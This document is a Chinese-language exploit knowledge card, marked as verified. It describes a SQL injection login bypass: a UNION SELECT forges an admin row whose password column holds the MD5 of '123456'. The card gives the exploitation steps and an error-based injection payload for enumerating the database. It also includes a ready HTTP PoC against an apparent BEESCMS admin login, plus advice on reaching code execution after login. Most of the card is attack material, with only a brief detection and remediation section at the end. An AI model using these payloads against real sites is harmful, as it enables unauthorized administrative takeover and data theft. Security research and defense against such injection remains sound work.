---
id: web-generic-sqli-login-union-forge-admin-known-md5
title: 登录处 UNION 注入伪造管理员行：密码列填已知明文 MD5 使哈希比对通过
type: scenario
domain: web
path: web/generic/sqli
technique: login-union-forge-row-known-md5
aliases:
- 登录 UNION 伪造 admin
- 已知明文 MD5 登录绕过
- e10adc3949ba59abbe56e057f20f883e
- 伪造密码哈希登录后台
- union select 1,'admin',md5
tags:
- sqli
- union-injection
- login-bypass
- md5
- admin-takeover
- php
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:38:50+08:00'
  notes: '已对照原文与图19/20/21核对：原文给出 '' uniselecton+selselectect+1,''admin'',''e10adc3949ba59abbe56e057f20f883e'',0,0 # 的双写（select/union 被过滤后还原）与伪造 admin 行登录，与卡内 UNION 伪造已知明文 MD5 行的原理、列数与 e10adc3949...=md5(123456) 一致；卡内 PoC 用未双写的 user=-1'' union select ...，是等价简化形态。未验证点：原文该 payload 为双写形式且连接参数名为 user/code，卡内按通用形态写；未复跑登录；原文无产品版本（图20 为 BEESCMS v4.0 后台），未设 affected_versions。'
---

## 一句话结论

当登录逻辑先对提交的密码做 `md5()`（或把哈希直接拼进 SQL）、再拿结果与数据库里的哈希比对时，`UNION SELECT` 可以伪造一整行管理员记录，密码列直接写成某个已知明文的 MD5（如 `e10adc3949ba59abbe56e057f20f883e` 对应 `123456`），于是用该明文即可登录，既不需要破解真实哈希，也不需要注释掉密码条件。

## 原理

- 典型实现：`SELECT id,username,password,role FROM admin WHERE username='<输入>' AND password='<md5(输入密码)>'`；密码在进入 SQL 前已变成哈希，所以「注入点只用注释符绕过密码」之外，还存在「让查询返回一行哈希等于我所知的值」的路径。
- UNION 的语义是把第二个 SELECT 的结果集拼到第一个结果集后；`' union select 1,'admin','<已知MD5>',0 #` 会让查询返回攻击者自造的行：用户名为 `admin`、密码列为已知哈希。后续 `fetch_assoc()` 取第一行、`num_rows>0` 判定成功，登录即通过。
- 通过的关键是「哈希比对发生在应用层还是 SQL 层」：若应用取回行后用 `password_verify`/自写比较函数核对，必须让伪造行的哈希与提交明文的哈希一致，所以选一个攻击者知道明文的哈希（弱口令的 MD5 彩虹表值），而不是随便填。
- 该技巧的另一半价值在于：它同时确定了列数与列序（`ORDER BY` 或逐步补列），并为后续「把 `database()`、`user()` 等函数塞进回显列」提供同一注入点，报错注入取库名与 UNION 伪造行可以复用同一个参数。
- 与「万能密码」的差别：`admin'#` 依赖密码条件被注释掉；若代码把哈希算好后再参数化、或对输入做了单引号转义但保留其它拼接，注释符路径可能失效，而 UNION 伪造行只要存在一处未参数化的字符串拼接就能用。

## 触发条件

- 登录接口把用户名或密码直接拼进 SQL（单引号字符串拼接、`LIKE`、`ORDER BY` 等），存在 UNION 注入。
- 应用把用户提交的明文密码转成 MD5（或其它无盐快速哈希）后再比对，且数据库里存的是同一算法结果。
- 攻击者知道某弱口令的哈希值（如 `123456` → `e10adc3949ba59abbe56e057f20f883e`），并能控制 UNION 的列数与类型。
- 查询结果被用于判定登录成功（`num_rows>0` / 取第一行），不校验行来源或会话签名。

## 利用步骤

1. 判定注入与列数：先用 `' order by N#` 或逐步补 `union select 1,2,3...` 确定列数与回显位。
2. 用报错注入确认库名/表名（`extractvalue(1,concat(0x7e,(database())))`），确认 `admin` 表与列名。
3. 构造伪造行：`union select 1,'admin','e10adc3949ba59abbe56e057f20f883e',0 #`，把密码列放在与真实查询相同的列位。
4. 用对应明文（本例 `123456`）作为密码提交；应用算出的哈希与伪造行一致，登录成功。
5. 登录后进入后台，继续找上传/模板/配置类功能落地代码执行，或读取后台可见的敏感数据。

## PoC

```http
POST /admin/login.php?action=ck_login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

user=-1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e',0,0 #&password=123456&code=1&submit=true
```

```sql
-- 查询语义（等价）
SELECT id,username,password,role FROM admin
WHERE username='-1' UNION SELECT 1,'admin','e10adc3949ba59abbe56e057f20f883e',0
-- 返回自造行，密码哈希与 md5('123456') 相同
```

```bash
# 已知明文哈希的速查（弱口令字典）
printf '123456' | md5sum   # e10adc3949ba59abbe56e057f20f883e
```

## 变体与关联

- 变体：应用改存 SHA1/`md5(md5(pass))` 时，把伪造行的哈希换成对应算法的已知明文值；若带固定盐，则盐值必须已知（可从源码/其它泄露点取得）。
- 变体：只回显 `username` 时，可让伪造行的用户名等于提交值，或改用 `ORDER BY` 字典序盲注（见关联卡）。
- 变体：若注入点是数字型或 `LIMIT` 位置，UNION 需相应调整列数与类型（`NULL` 占位最常见）。
- 关联：`[[web-generic-sqli-login-username-comment-universal-password]]` 是注释符万能密码路径；`[[web-generic-sqli-blind-ascii-case-restore-login]]` 是同一登录点上的盲注路径；本卡是「伪造结果行并匹配哈希」的第三条路径。
- 边界：使用 `password_hash`/`password_verify`（bcrypt/argon2 带随机盐）、预处理语句、或登录后二次校验（如要求邮箱验证码）时，链断。

## 检测与防御

- 检测：登录请求体出现 `union`、`select`、`#`、十六进制或已知 MD5 常量；`user` 参数值以 `'`/`-1` 开头；同一 IP 先做 `order by` 探测再登录成功。
- 修复：所有 SQL 使用参数化查询；登录比对用 `password_verify` 与带盐的慢哈希；禁止把哈希值拼进 SQL。
- 加固：登录失败响应统一文案与耗时；对同一账号/同一 IP 的连续失败做限速与告警；后台登录加二次因子。
